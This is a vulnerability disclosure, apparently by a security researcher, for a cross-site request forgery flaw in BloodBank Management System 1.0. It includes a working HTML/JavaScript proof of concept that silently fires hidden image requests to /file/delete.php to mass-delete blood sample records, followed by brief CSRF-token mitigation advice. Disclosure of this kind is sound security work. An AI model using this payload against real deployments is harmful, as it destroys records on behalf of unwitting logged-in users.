
## **Affected Version:**
- **BloodBank Management System**: 1.0

## **Vulnerability Information:**
- **Vulnerability Type:** Cross Site Request Forgery (CSRF)
- **Severity:** HIGH
- **Status:** Unpatched

## **Vulnerable Endpoint:**
- **Path:** `/file/delete.php?bid=`

## **Vulnerability Description:**
A **Cross Site Request Forgery (CSRF)** vulnerability was discovered in the **blood request functionality** of the BloodBank Management System. This flaw occurs when sending a `delete` request to this path `/file/delete.php?bid=` allowing the `bid` parameter to select a record to delete on the application. The `bids` however are dynamic depending on adding the blood samples, so to make the request successfull i used a javascript generated image tag within a loop. 

Successful exploitation can lead to **unauthorized actions ie deletion of data** on behalf of the victim. Additionally, this could be exploited by visiting malicious websites with the payload.

---

## **Proof of Concept (PoC):**

Below is an example of a **CSRF POC Attack** that deletes the `available blood samples`  via the `bid` parameter, host the file on an attacker controlled domain in my case i was using `localhost`:

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC</title>
</head>
<body>
    <h2>CSRF Proof of Concept for Deleting Blood Bank Records</h2>
    <script>
        // Define the target URL where the Blood Bank System is hosted
        const targetUrl = "http://localhost/bloodbank/file/delete.php";

        // Loop through possible bid values (0 to 20) can be increased to as much as possible :)
        for (let bid = 0; bid <= 20; bid++) {
            // Create an image element for each bid value to send the GET request
            let img = document.createElement("img");
            img.src = `${targetUrl}?bid=${bid}`;
            img.style.display = "none";  // Hide the image from view
            document.body.appendChild(img);
        }
    </script>
</body>
</html>

```

---


## Video POC

- ![video link ](./bloodbank-delete-csrf.mp4)

## **Impact:**
- **Data Manipulation:** Attackers could modify the content displayed to users.
- **Reputational Damage:** Users may lose trust in the system due to malicious behavior.

---

## **Mitigation Recommendations:**
1. **Use CSRF Token** Implement mechanism to deter cross domain access or put `csrf tokens` in your request and also avoid `GET` requests from making state changing actions

---
